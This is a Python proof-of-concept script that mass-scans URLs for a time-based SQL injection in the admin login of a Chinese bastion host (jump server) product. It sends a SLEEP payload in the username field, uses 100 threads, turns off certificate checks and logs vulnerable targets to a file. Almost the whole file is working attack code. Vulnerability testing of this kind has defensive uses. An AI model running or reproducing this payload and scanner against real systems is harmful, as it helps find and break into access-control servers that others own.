import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:中远麒麟堡垒机存在SQL注入
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/admin.php?controller=admin_commonuser"
    data = "username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND 'AAdm'='AAdm"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36",
        "Connection": "close",
        "Content-Length": "79",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip"
    }
    res1 = requests.get(url=target, verify=False,timeout=5)   # 0.3
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target,verify=False)  # 10.3
            res3 = requests.post(url=target+payload, data=data, headers=headers, verify=False)
            time2 = res2.elapsed.total_seconds()
            time3 = res3.elapsed.total_seconds()
            if time3-time2 >= 9 and time3 > 10:  ## 这里判断只要res2响应超过5秒，就判断存在漏洞，因为正常响应时间不超过1秒
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(f"该{target}存在延时注入漏洞{time3 - time2}\n")
                print(f"该{target}存在延时注入漏洞{time3 - time2}")
            elif time3 < 9:
                print(f"该{target}不存在延时注入漏洞{time3 - time2}")
        else:
            print(f"该{target}存在问题，请手动测试")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()



